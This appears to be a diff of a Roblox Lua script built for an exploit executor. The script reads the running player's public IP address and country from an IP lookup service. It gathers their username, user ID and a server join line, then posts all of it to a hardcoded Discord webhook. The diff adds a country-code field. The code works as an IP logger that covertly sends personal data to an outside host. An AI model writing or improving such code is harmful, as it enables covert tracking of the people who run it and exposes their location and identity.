@@ -1,20 +1,21 @@
-local Http       = game:GetService("HttpService")
+local Http              = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
-local WebhookUrl = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
-local executor   = identifyexecutor() or "idk"
+local WebhookUrl        = "https://discord.com/api/webhooks/1379048133702455396/TmMAJJF_g_04qtJasWYKHI2K0JmX-l01wp_LBGGNCj9wECRli2a3OtIXSW-PSyRgmuHy"
+local executor          = identifyexecutor() or "Unknown"
 
--- Get IP info from https://api.myip.com/
+-- Get IP info (country + country code + IP) from https://api.myip.com/
 local function getIPInfo()
     local success, response = pcall(function()
         return Http:GetAsync("https://api.myip.com/")
     end)
     if success then
         local data = Http:JSONDecode(response)
-        if data and data.country and data.ip then
-            return data.country, data.ip
+        -- data.country, data.cc, data.ip
+        if data and data.country and data.cc and data.ip then
+            return data.country, data.cc, data.ip
         end
     end
-    return "Unknown", "Unknown"
+    return "Unknown", "UNK", "Unknown"
 end
 
 -- Get actual game name using MarketplaceService
@@ -32,17 +33,17 @@ end
 
 local function sendRequest()
     local player      = game.Players.LocalPlayer
-    local displayName = player and player.DisplayName or "Display name not available"
+    local displayName = player and player.DisplayName or "N/A"
     local userName    = player and player.Name or "Unknown"
     local playerId    = player and player.UserId or 0
 
     local placeId = tostring(game.PlaceId)
     local jobId   = tostring(game.JobId)
     local joinScript = "game:GetService('TeleportService'):TeleportToPlaceInstance(" ..
-                        placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
+                       placeId .. ", '" .. jobId .. "', game.Players.LocalPlayer)"
 
-    -- Get country and IP from API
-    local country, ip = getIPInfo()
+    -- Get country, country code, and IP from API
+    local country, cc, ip = getIPInfo()
 
     -- Get the fixed game name
     local gameName = getGameName()
@@ -63,22 +64,27 @@ local function sendRequest()
                 },
                 fields = {
                     {
-                        name   = "Executor:",
+                        name   = "Executor",
                         value  = executor,
                         inline = true
                     },
                     {
-                        name   = "Country:",
+                        name   = "Country",
                         value  = country,
                         inline = true
                     },
                     {
-                        name   = "IP Address:",
+                        name   = "Country Code",
+                        value  = cc,
+                        inline = true
+                    },
+                    {
+                        name   = "IP Address",
                         value  = ip,
                         inline = true
                     },
                     {
-                        name   = "Game Name:",
+                        name   = "Game Name",
                         value  = gameName,
                         inline = false
                     },
